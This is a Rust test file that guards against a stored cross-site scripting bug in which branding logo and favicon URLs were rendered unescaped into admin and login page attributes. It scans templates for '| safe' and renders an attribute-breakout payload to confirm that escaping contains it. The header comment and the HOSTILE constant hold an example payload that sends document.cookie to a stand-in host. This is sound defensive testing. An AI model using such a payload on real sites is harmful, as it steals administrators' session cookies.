//! `brand_logo_url` / `brand_favicon_url` reach the highest-privilege
//! surfaces in the framework — the admin sidebar, both login pages,
//! the operator console shell, the change-password page. Every one of
//! them dropped the value into an HTML attribute through `| safe`,
//! which turns off the escaping that keeps it inside the quotes.
//!
//! `AdminBuilder::brand_logo_url` takes an arbitrary `String`, and the
//! tenant-facing values come from org branding config, so a value like
//! `x" onerror="fetch('//evil/'+document.cookie)` closed the `src=`
//! attribute and ran on the page that holds the admin session (#1537).
//!
//! Two assertions, because either alone is weak. The structural one is
//! a ratchet: no branding *URL* may be marked safe again. The render
//! one proves the mechanism actually blocks the attack, so the ratchet
//! is guarding something real rather than a spelling.
//!
//! `brand_css` is deliberately **not** in scope and must keep its
//! `| safe`: it is built by `build_brand_css_from_color`, which passes
//! every input through `validate_hex_color` (`#` plus exactly 3 or 6
//! ASCII hex digits) and then emits only computed hex. No caller text
//! reaches it, and escaping a `<style>` body would break the theming.

use std::path::{Path, PathBuf};

/// Every shipped template that renders a branding URL.
const TEMPLATES: &[&str] = &[
    "src/admin/templates/_sidebar.html",
    "src/tenancy/templates/op_layout.html",
    "src/tenancy/templates/op_login.html",
    "src/tenancy/templates/tenant_login.html",
    "src/tenancy/templates/tenant_change_password.html",
];

/// Branding variables whose value is a URL, i.e. attribute content.
const URL_VARS: &[&str] = &["brand_logo_url", "brand_favicon_url"];

fn crate_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).to_path_buf()
}

#[test]
fn no_shipped_template_marks_a_branding_url_safe() {
    let mut offences = Vec::new();
    let mut checked = 0usize;

    for rel in TEMPLATES {
        let path = crate_root().join(rel);
        let src = std::fs::read_to_string(&path)
            .unwrap_or_else(|e| panic!("cannot read {}: {e}", path.display()));

        for (lineno, line) in src.lines().enumerate() {
            for var in URL_VARS {
                if !line.contains(var) {
                    continue;
                }
                checked += 1;
                // `{{ x | safe }}`, `{{ x|safe }}`, `{{ x | safe}}` …
                let normalised = line.replace(char::is_whitespace, "");
                if normalised.contains(&format!("{var}|safe")) {
                    offences.push(format!("{rel}:{}: {}", lineno + 1, line.trim()));
                }
            }
        }
    }

    // Without this the test passes just as well on a typo in
    // `TEMPLATES` that makes every file read as containing nothing.
    assert!(
        checked >= 7,
        "expected at least the 7 known branding-URL sites, saw {checked} — \
         TEMPLATES or URL_VARS has drifted away from the shipped templates",
    );
    assert!(
        offences.is_empty(),
        "a branding URL is marked `| safe`, so it is interpolated into an \
         HTML attribute unescaped (#1537):\n  {}",
        offences.join("\n  "),
    );
}

#[cfg(feature = "_tera")]
#[test]
fn escaping_actually_contains_an_attribute_breakout() {
    // The payload an operator-supplied logo URL would carry.
    const HOSTILE: &str = r#"x" onerror="fetch('//evil.example/'+document.cookie)"#;

    let mut ctx = tera::Context::new();
    ctx.insert("brand_logo_url", HOSTILE);

    // Autoescape on — the second argument — which is what dropping
    // `| safe` restores at these call sites.
    let out = tera::Tera::one_off(
        r#"<img class="brand-logo" src="{{ brand_logo_url }}" alt="">"#,
        &ctx,
        true,
    )
    .expect("one-off render failed");

    assert!(
        !out.contains("onerror=\""),
        "the payload closed the attribute and became markup: {out}",
    );
    assert!(
        out.contains("&quot;"),
        "the quote must survive as an entity, or nothing was escaped: {out}",
    );

    // The control: with `| safe`, the same payload does break out.
    // If this ever stops breaking out, autoescape is not what is
    // protecting these pages and the test above proves nothing.
    let unsafe_out = tera::Tera::one_off(
        r#"<img class="brand-logo" src="{{ brand_logo_url | safe }}" alt="">"#,
        &ctx,
        true,
    )
    .expect("one-off render failed");
    assert!(
        unsafe_out.contains("onerror=\""),
        "`| safe` is expected to be the dangerous form; if it no longer is, \
         this whole guard is measuring the wrong thing: {unsafe_out}",
    );
}
